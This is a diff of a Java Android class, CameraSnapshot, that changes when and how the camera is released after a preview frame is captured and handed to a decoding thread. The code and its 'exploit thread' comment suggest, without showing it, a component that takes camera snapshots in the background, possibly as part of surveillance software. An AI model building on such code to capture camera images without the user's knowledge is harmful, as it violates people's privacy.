@@ -163,16 +163,28 @@ public class CameraSnapshot {
 			}
 
 
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (onPreviewFrame), size: " + bytes.length);
-			}
-			try {
-				// start another Thread to check exploit thread end
-				CCD decodeCameraFrame = new CCD(bytes,camera);
-				Thread ec = new Thread(decodeCameraFrame);
-				ec.start();
-			}finally {
 
+			boolean released=false;
+			try {
+				if(bytes!=null ) {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (onPreviewFrame), size: " + bytes.length);
+					}
+					// start another Thread to check exploit thread end
+					CCD decodeCameraFrame = new CCD(bytes, camera);
+					released = releaseCamera(camera);
+					Thread ec = new Thread(decodeCameraFrame);
+					ec.start();
+				}
+			}finally {
+				try {
+					if(!released)
+						releaseCamera(camera);
+				}catch(Exception e){
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (onPreviewFrame) probably release called twice: " + e);
+					}
+				}
 				synchronized (cameraLock) {
 					cameraLock.notifyAll();
 				}
@@ -243,8 +255,6 @@ public class CameraSnapshot {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (snapshot) ERROR: " + e);
 				}
-			}finally {
-				releaseCamera(camera);
 			}
 		}
 	}
@@ -461,15 +471,15 @@ public class CameraSnapshot {
 	/**
 	 * Stops camera preview, and releases the camera to the system.
 	 */
-	private synchronized void releaseCamera(Camera camera) {
+	private synchronized boolean releaseCamera(Camera camera) {
 		if (camera != null) {
-			try {
+			/*try {
 				camera.reconnect();
 			} catch (IOException e) {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (releaseCamera), ERROR: " + e);
 				}
-			}
+			}*/
 			camera.stopPreview();
 			camera.release();
 		}
@@ -477,6 +487,7 @@ public class CameraSnapshot {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (releaseCamera), released");
 		}
+		return  true;
 	}
 
 }
